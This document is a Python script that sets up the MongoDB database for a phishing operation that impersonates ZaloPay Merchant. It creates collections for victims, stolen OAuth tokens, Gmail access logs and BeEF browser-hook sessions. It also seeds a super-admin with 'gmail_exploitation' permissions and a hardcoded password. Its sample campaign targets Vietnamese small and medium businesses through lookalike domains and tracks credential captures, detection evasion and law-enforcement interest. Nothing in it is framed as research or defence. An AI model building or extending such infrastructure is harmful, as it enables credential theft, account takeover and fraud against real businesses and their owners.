"""
MongoDB Collections Initialization Script
Creates all collections with proper indexes according to database schema documentation
Includes replica set initialization and default admin user creation
"""

import logging
import os
import time
from datetime import datetime, timezone
from pymongo import MongoClient
from pymongo.errors import OperationFailure, PyMongoError
from passlib.context import CryptContext

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configure password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

class MongoDBInitializer:
    """MongoDB collections and indexes initializer"""

    def __init__(self, connection_string: str, database_name: str):
        self.connection_string = connection_string
        self.database_name = database_name
        self.client = None
        self.db = None

    def connect(self) -> bool:
        """Connect to MongoDB"""
        try:
            self.client = MongoClient(
                self.connection_string,
                serverSelectionTimeoutMS=5000,
                maxPoolSize=10,
                minPoolSize=2
            )

            # Test connection
            self.client.admin.command('ping')
            self.db = self.client[self.database_name]

            logger.info("Connected to MongoDB: %s", self.database_name)
            return True

        except PyMongoError as e:
            logger.error("MongoDB connection failed: %s", e)
            return False

    def create_collections(self) -> bool:
        """Create all required collections"""
        try:
            collections = [
                "victims",
                "oauth_tokens",
                "admin_users",
                "campaigns",
                "activity_logs",
                "gmail_access_logs",
                "beef_sessions",
                "migrations"
            ]

            for collection_name in collections:
                if collection_name not in self.db.list_collection_names():
                    self.db.create_collection(collection_name)
                    logger.info("Created collection: %s", collection_name)
                else:
                    logger.info("Collection already exists: %s", collection_name)

            return True

        except PyMongoError as e:
            logger.error("Error creating collections: %s", e)
            return False

    def create_indexes(self) -> bool:
        """Create all required indexes according to database-schema-documentation"""
        try:
            # Victims collection indexes
            victims_collection = self.db.victims
            victims_indexes = [
                ({"email": 1}, {"unique": True}),
                ({"victim_id": 1}, {"unique": True}),
                ({"phone": 1}, {}),
                ({"created_at": -1}, {}),
                ({"last_activity": -1}, {}),
                ({"campaign_id": 1, "created_at": -1}, {}),
                ({"status": 1}, {}),
                ({"risk_score": -1}, {}),
                ({"verification_status": 1}, {}),
                ({"behavior_pattern": 1}, {}),
                ({"device_fingerprint": 1}, {}),
                ({"location.coordinates": "2dsphere"}, {}),
                ({"location.city": 1}, {}),
                ({"location.country": 1}, {}),
                ({"business_indicators.business_value_score": -1}, {}),
                ({"risk_assessment.overall_risk_level": 1}, {}),
                ({"risk_assessment.last_assessment": -1}, {}),
                ([("personal_info.full_name", "text"), ("personal_info.email", "text"), ("bank_info.bank_name", "text")], {})
            ]

            for index_spec, options in victims_indexes:
                try:
                    if isinstance(index_spec, list):
                        # Text index
                        victims_collection.create_index(index_spec, **options)
                    else:
                        victims_collection.create_index(list(index_spec.keys()), **options)
                    logger.info("Created victims index: %s", index_spec)
                except PyMongoError as e:
                    logger.warning("Failed to create victims index %s: %s", index_spec, e)

            # OAuth tokens collection indexes
            oauth_collection = self.db.oauth_tokens
            oauth_indexes = [
                ({"victim_id": 1}, {}),
                ({"provider": 1, "token_metadata.status": 1}, {}),
                ({"tokens.expires_at": 1}, {"expireAfterSeconds": 0}),  # TTL index
                ({"token_metadata.issued_at": -1}, {}),
                ({"token_metadata.last_refresh": -1}, {}),
                ({"token_metadata.last_used": -1}, {}),
                ({"profile_data.email": 1}, {}),
                ({"created_at": -1}, {})
            ]

            for index_spec, options in oauth_indexes:
                try:
                    oauth_collection.create_index(list(index_spec.keys()), **options)
                    logger.info("Created oauth_tokens index: %s", index_spec)
                except PyMongoError as e:
                    logger.warning("Failed to create oauth_tokens index %s: %s", index_spec, e)

            # Admin users collection indexes
            admin_collection = self.db.admin_users
            admin_indexes = [
                ({"username": 1}, {"unique": True}),
                ({"email": 1}, {"unique": True}),
                ({"role": 1, "is_active": 1}, {}),
                ({"activity_summary.last_login": -1}, {}),
                ({"activity_summary.last_activity": -1}, {}),
                ({"security_flags.account_locked": 1}, {}),
                ({"security_flags.password_expired": 1}, {}),
                ({"admin_metadata.clearance_level": 1}, {}),
                ({"created_at": -1}, {}),
                ({"updated_at": -1}, {})
            ]

            for index_spec, options in admin_indexes:
                try:
                    admin_collection.create_index(list(index_spec.keys()), **options)
                    logger.info("Created admin_users index: %s", index_spec)
                except PyMongoError as e:
                    logger.warning("Failed to create admin_users index %s: %s", index_spec, e)

            # Campaigns collection indexes
            campaigns_collection = self.db.campaigns
            campaigns_indexes = [
                ({"code": 1}, {"unique": True}),
                ({"status": 1, "timeline.actual_start": -1}, {}),
                ({"team.campaign_manager": 1}, {}),
                ({"config.geographic_targeting.primary_countries": 1}, {}),
                ({"timeline.current_phase": 1}, {}),
                ({"statistics.total_visits": -1}, {}),
                ({"statistics.credential_captures": -1}, {}),
                ({"risk_assessment.current_risk_level": 1}, {}),
                ({"created_at": -1}, {}),
                ({"updated_at": -1}, {}),
                ({"created_by": 1}, {})
            ]

            for index_spec, options in campaigns_indexes:
                try:
                    campaigns_collection.create_index(list(index_spec.keys()), **options)
                    logger.info("Created campaigns index: %s", index_spec)
                except PyMongoError as e:
                    logger.warning("Failed to create campaigns index %s: %s", index_spec, e)

            # Activity logs collection indexes
            activity_collection = self.db.activity_logs
            activity_indexes = [
                ({"actor.admin_id": 1, "timestamp": -1}, {}),
                ({"action_type": 1, "timestamp": -1}, {}),
                ({"target.resource_type": 1, "target.resource_id": 1}, {}),
                ({"timestamp": -1}, {}),
                ({"retention_expires": 1}, {"expireAfterSeconds": 0}),  # TTL index (2-year retention)
                ({"action_category": 1, "severity_level": 1, "timestamp": -1}, {}),
                ({"actor.username": 1, "timestamp": -1}, {}),
                ({"actor.ip_address": 1, "timestamp": -1}, {}),
                ({"severity_level": 1, "timestamp": -1}, {}),
                ({"target.resource_type": 1, "action_type": 1}, {})
            ]

            for index_spec, options in activity_indexes:
                try:
                    activity_collection.create_index(list(index_spec.keys()), **options)
                    logger.info("Created activity_logs index: %s", index_spec)
                except PyMongoError as e:
                    logger.warning("Failed to create activity_logs index %s: %s", index_spec, e)

            # Gmail access logs collection indexes
            gmail_collection = self.db.gmail_access_logs
            gmail_indexes = [
                ({"admin_id": 1, "created_at": -1}, {}),
                ({"victim_id": 1, "created_at": -1}, {}),
                ({"access_session.session_id": 1}, {}),
                ({"access_session.start_time": -1}, {}),
                ({"access_session.access_method": 1}, {}),
                ({"access_session.success": 1}, {}),
                ({"intelligence_analysis.overall_intelligence_value": -1}, {}),
                ({"intelligence_analysis.business_intelligence.company_insights": -1}, {}),
                ({"intelligence_analysis.security_intelligence.password_patterns": -1}, {}),
                ({"operational_security.proxy_used": 1}, {}),
                ({"operational_security.vpn_location": 1}, {}),
                ({"created_at": -1}, {})
            ]

            for index_spec, options in gmail_indexes:
                try:
                    gmail_collection.create_index(list(index_spec.keys()), **options)
                    logger.info("Created gmail_access_logs index: %s", index_spec)
                except PyMongoError as e:
                    logger.warning("Failed to create gmail_access_logs index %s: %s", index_spec, e)

            # BeEF sessions collection indexes
            beef_collection = self.db.beef_sessions
            beef_indexes = [
                ({"beef_session.hook_id": 1}, {"unique": True}),
                ({"victim_id": 1, "created_at": -1}, {}),
                ({"beef_session.status": 1, "beef_session.last_seen": -1}, {}),
                ({"expires_at": 1}, {"expireAfterSeconds": 0}),  # TTL index
                ({"intelligence_summary.overall_success_rate": -1}, {}),
                ({"browser_intelligence.browser": 1}, {}),
                ({"browser_intelligence.os": 1}, {}),
                ({"intelligence_summary.total_commands_executed": -1}, {}),
                ({"intelligence_summary.successful_commands": -1}, {}),
                ({"created_at": -1}, {}),
                ({"updated_at": -1}, {})
            ]

            for index_spec, options in beef_indexes:
                try:
                    beef_collection.create_index(list(index_spec.keys()), **options)
                    logger.info("Created beef_sessions index: %s", index_spec)
                except PyMongoError as e:
                    logger.warning("Failed to create beef_sessions index %s: %s", index_spec, e)

            return True

        except PyMongoError as e:
            logger.error("Error creating indexes: %s", e)
            return False

    def create_default_admin_user(self) -> bool:
        """Create default admin user"""
        try:
            admin_collection = self.db.admin_users

            # Check if admin user already exists
            existing_admin = admin_collection.find_one({"username": "admin"})
            if existing_admin:
                logger.info("Default admin user already exists")
                return True

            # Hash password
            password = "Admin@2025"
            password_hash = pwd_context.hash(password)

            # Create admin user document
            admin_user = {
                "username": "admin",
                "email": "admin@zalopaymerchan.com",
                "password_hash": password_hash,
                "role": "super_admin",
                "permissions": [
                    "dashboard_view",
                    "victim_management",
                    "gmail_exploitation",
                    "beef_control",
                    "campaign_management",
                    "data_export",
                    "system_monitoring",
                    "admin_management"
                ],
                "access_restrictions": {
                    "ip_whitelist": ["0.0.0.0/0"],  # Allow from anywhere for initial setup
                    "time_restrictions": {
                        "allowed_hours": list(range(0, 24)),  # 24/7 access
                        "timezone": "Asia/Ho_Chi_Minh"
                    },
                    "data_access_level": "all"
                },
                "mfa_config": {
                    "mfa_enabled": False,
                    "mfa_method": "totp",
                    "totp_secret": None,
                    "backup_codes": [],
                    "last_mfa_reset": None
                },
                "session_config": {
                    "max_concurrent_sessions": 5,
                    "session_timeout_minutes": 120,
                    "idle_timeout_minutes": 30,
                    "require_fresh_auth_for_sensitive": True
                },
                "activity_summary": {
                    "last_login": None,
                    "last_activity": None,
                    "login_count_30d": 0,
                    "failed_login_attempts_24h": 0,
                    "victims_accessed_30d": 0,
                    "gmail_exploitations_30d": 0,
                    "data_exports_30d": 0
                },
                "security_flags": {
                    "account_locked": False,
                    "password_expired": False,
                    "suspicious_activity": False,
                    "last_password_change": datetime.now(timezone.utc),
                    "password_change_required": False
                },
                "admin_metadata": {
                    "created_by": None,
                    "department": "System Administration",
                    "clearance_level": "maximum",
                    "training_completed": [
                        "opsec_fundamentals",
                        "gmail_exploitation",
                        "beef_framework",
                        "legal_compliance",
                        "system_administration"
                    ]
                },
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc),
                "is_active": True
            }

            # Insert admin user
            result = admin_collection.insert_one(admin_user)
            logger.info("Created default admin user with ID: %s", result.inserted_id)

            return True

        except PyMongoError as e:
            logger.error("Error creating default admin user: %s", e)
            return False

    def create_sample_campaign(self) -> bool:
        """Create a sample campaign for testing"""
        try:
            campaigns_collection = self.db.campaigns

            # Check if sample campaign already exists
            existing_campaign = campaigns_collection.find_one({"code": "ZPM_Q4_2025_VN_SME"})
            if existing_campaign:
                logger.info("Sample campaign already exists")
                return True

            # Create sample campaign
            sample_campaign = {
                "name": "ZaloPay Merchant Q4 2025 - Vietnamese SME",
                "code": "ZPM_Q4_2025_VN_SME",
                "description": ("Targeting Vietnamese small-medium enterprises với "
                               "ZaloPay Merchant registration theme"),
                "config": {
                    "target_domains": [
                        "zalopaymerchan.com",
                        "zalopay-business.net",
                        "merchant.zalopay.vn"
                    ],
                    "landing_template": "zalopay_merchant_v2_vietnamese",
                    "authentication_methods": ["google_oauth", "apple_oauth", "manual_form"],
                    "geographic_targeting": {
                        "primary_countries": ["VN"],
                        "secondary_countries": ["TH", "MY", "SG"],
                        "exclude_countries": ["US", "EU", "AU"]
                    },
                    "demographic_targeting": {
                        "target_languages": ["vi", "vi-VN"],
                        "business_focus": True,
                        "executive_targeting": True,
                        "tech_savvy_level": "medium"
                    }
                },
                "infrastructure": {
                    "proxy_pool": "vietnam_residential_premium",
                    "beef_enabled": True,
                    "anti_detection_level": "high",
                    "load_balancing": "round_robin",
                    "backup_domains": [
                        "zalopay-registration.com",
                        "merchant-zalopay.net"
                    ]
                },
                "timeline": {
                    "planned_start": datetime.now(timezone.utc),
                    "actual_start": None,
                    "planned_end": datetime(2025, 12, 31, 23, 59, 59, tzinfo=timezone.utc),
                    "current_phase": "planning",
                    "milestones": []
                },
                "statistics": {
                    "total_visits": 0,
                    "unique_visitors": 0,
                    "credential_captures": 0,
                    "successful_validations": 0,
                    "high_value_targets": 0,
                    "business_accounts": 0,
                    "conversion_rates": {
                        "visit_to_interaction": 0.0,
                        "interaction_to_auth_attempt": 0.0,
                        "auth_attempt_to_capture": 0.0,
                        "capture_to_validation": 0.0,
                        "overall_conversion": 0.0
                    },
                    "performance_metrics": {
                        "average_session_duration_seconds": 0,
                        "bounce_rate": 0.0,
                        "pages_per_session": 0.0,
                        "load_time_average_ms": 0,
                        "proxy_success_rate": 0.0
                    },
                    "geographic_distribution": {},
                    "hourly_performance": {
                        "peak_hours": [],
                        "best_conversion_hours": [],
                        "worst_performance_hours": []
                    }
                },
                "success_criteria": {
                    "target_captures": 1000,
                    "target_validations": 700,
                    "target_high_value": 100,
                    "min_success_rate": 0.20,
                    "max_detection_incidents": 5
                },
                "risk_assessment": {
                    "current_risk_level": "low",
                    "detection_incidents": 0,
                    "law_enforcement_interest": "none",
                    "technical_countermeasures": 0,
                    "mitigation_actions": []
                },
                "team": {
                    "campaign_manager": None,
                    "technical_lead": None,
                    "analysts": [],
                    "operators": []
                },
                "status": "draft",
                "status_history": [
                    {
                        "status": "draft",
                        "timestamp": datetime.now(timezone.utc),
                        "changed_by": None,
                        "reason": "Sample campaign created during initialization"
                    }
                ],
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc),
                "created_by": None
            }

            # Insert sample campaign
            result = campaigns_collection.insert_one(sample_campaign)
            logger.info("Created sample campaign with ID: %s", result.inserted_id)

            return True

        except PyMongoError as e:
            logger.error("Error creating sample campaign: %s", e)
            return False

    def initialize_replica_set(self) -> bool:
        """Initialize MongoDB replica set if not already configured"""
        try:
            logger.info("Checking replica set configuration...")

            # Check if replica set is already initialized
            try:
                rs_status = self.client.admin.command("replSetGetStatus")
                if rs_status.get("ok") == 1:
                    logger.info("Replica set already initialized")
                    return True
            except OperationFailure:
                logger.info("Replica set not initialized, proceeding with initialization")

            # Initialize replica set
            rs_config = {
                "_id": "rs0",
                "members": [
                    {"_id": 0, "host": "mongodb-primary:27017", "priority": 2},
                    {"_id": 1, "host": "mongodb-secondary-1:27017", "priority": 1},
                    {"_id": 2, "host": "mongodb-secondary-2:27017", "priority": 1}
                ]
            }

            self.client.admin.command("replSetInitiate", rs_config)
            logger.info("Replica set initialization initiated")

            # Wait for replica set to be ready
            max_attempts = 30
            for attempt in range(max_attempts):
                try:
                    rs_status = self.client.admin.command("replSetGetStatus")
                    if rs_status.get("ok") == 1:
                        logger.info("Replica set is ready")
                        return True
                except OperationFailure:
                    pass

                logger.info("Waiting for replica set to be ready... "
                           "(attempt %d/%d)", attempt + 1, max_attempts)
                time.sleep(2)

            logger.warning("Replica set initialization timeout")
            return False

        except PyMongoError as e:
            logger.error("Error initializing replica set: %s", e)
            return False

    def initialize_all(self) -> bool:
        """Initialize all collections, indexes, and default data"""
        try:
            logger.info("Starting MongoDB initialization...")

            # Connect to MongoDB
            if not self.connect():
                return False

            # Initialize replica set
            if not self.initialize_replica_set():
                logger.warning("Replica set initialization failed, continuing "
                              "with single node setup")

            # Create collections
            if not self.create_collections():
                return False

            # Create indexes
            if not self.create_indexes():
                return False

            # Create default admin user
            if not self.create_default_admin_user():
                return False

            # Create sample campaign
            if not self.create_sample_campaign():
                return False

            logger.info("MongoDB initialization completed successfully")
            return True

        except PyMongoError as e:
            logger.error("MongoDB initialization failed: %s", e)
            return False
        finally:
            if self.client:
                self.client.close()

async def initialize_collections_async():
    """Async wrapper for collection initialization"""
    # Get connection details from environment
    mongodb_connection_uri = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
    database_name_env = os.getenv("MONGODB_DATABASE", "zalopay_phishing")

    # Initialize MongoDB
    db_initializer = MongoDBInitializer(mongodb_connection_uri, database_name_env)
    return db_initializer.initialize_all()

if __name__ == "__main__":
    # Run initialization
    connection_uri_main = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
    database_name_main = os.getenv("MONGODB_DATABASE", "zalopay_phishing")

    db_initializer_main = MongoDBInitializer(connection_uri_main, database_name_main)
    INIT_SUCCESS = db_initializer_main.initialize_all()

    if INIT_SUCCESS:
        print("MongoDB initialization completed successfully")
        exit(0)
    else:
        print("MongoDB initialization failed")
        exit(1)
